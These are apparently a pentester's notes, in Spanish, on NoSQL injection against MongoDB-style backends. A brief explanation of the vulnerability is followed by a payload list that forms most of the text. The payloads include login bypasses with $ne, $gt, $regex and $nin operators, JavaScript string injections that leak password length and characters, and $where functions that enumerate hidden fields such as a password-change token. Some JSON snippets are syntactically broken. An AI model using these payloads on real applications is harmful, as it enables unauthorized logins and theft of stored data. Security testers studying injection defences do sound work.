-- - 
Las inyecciones NoSQL son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en documentos en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las bases de datos relacionales.
-- - 
in DATA
```json
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
# For testing
'
'+'
'%2b'
' && '1' == '2 ---> url-encoded
' && '1' == '1 ---> url-encoded
administrator' && this.password.length > 7 || 'a'=='b  ---> url-encoded
administrator' && this.password[0] == 'k' || 'a'=='b ---> url-encoded
```

in JSON:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

```json
{
	"username":"admin",
	"password":{
	"$regex":".{29}" --> Consulto si la longitud de la contraseña es = 29
	"$regex": "^.{29}$" 
	}				   
}

{
	"username":"admin",
	"password":{
	"$regex":"^a" --> Consulto si la contraseña empieza por a
	}				   
}

{
	"username":"carlos",
	"password":{"$ne":""
},
	"$where":  "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0;}" ---> Consulto si el primer atributo del documento es _id
}

{
	"username":"carlos",
	"password":{"$ne":""
},
	"$where": "function(){ if(Object.keys(this)[3].length == 1) return 1; else 0;}" ---> Consulto la longitud
}

## Luego la idea es moverse por el indice del array de documento para ir identificando los parametros que estan ocultos

{
	"username":"carlos",
	"password":{"$ne":""
},
	"$where": "function(){ if(Object.keys(this)[4].match(/^a/)) return 1; else 0;}" ---> Consulto por que letra empieza
}


{
	"username":"carlos",
	"password":{"$ne":""},
	"$where":"function(){ if(this.changePwd.length == 1) return 1; else 0;}" ---> Consulto la longitud del campo escondido
}

{
	"username":"carlos",
	"password":{"$ne":""},
	"$where":"function(){ if(this.changePwd.match(/^a/)) return 1; else 0;}" ---> Consulto por que letra empiza el campo escondido
}


```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
-- - 
